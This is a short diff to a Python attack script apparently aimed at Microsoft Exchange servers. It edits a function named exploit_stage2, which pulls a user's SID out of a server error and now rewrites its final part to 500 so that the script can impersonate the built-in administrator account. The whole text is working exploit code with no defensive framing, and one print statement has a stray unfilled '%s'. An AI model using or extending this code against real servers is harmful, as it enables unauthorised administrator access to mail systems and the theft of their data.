@@ -6,6 +6,7 @@ import string
 import codecs
 import sys
 
+
 print("   ___                    __                         ")
 print("  / _ \_______ __ ____ __/ /  ___  ___ ____  ___     ")
 print(" / ___/ __/ _ \\\\ \ / // / /__/ _ \/ _ `/ _ \/ _ \\ ")
@@ -108,7 +109,18 @@ def exploit_stage2(target, email, user_agent, random_name, legacyDn, FQDN):
         exit()
 
     sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
-    print("[Stage 2] Succesfully obtained SID: " + sid)
+
+    if sid.split("-")[-1] != "500":
+        print("[Stage 2] User SID not an administrator, fixing user SID%s")
+        base_sid = sid.split("-")[:-1]
+        base_sid.append("500")
+        sid = "-".join(base_sid)
+
+        print("[Stage 2] Got target administrator SID: %s" % sid)
+    else:
+        print("[Stage 2] Got target administrator SID: %s" % sid)
+
+    print("[Stage 2] Successfully obtained SID: " + sid)
     return sid
 
 
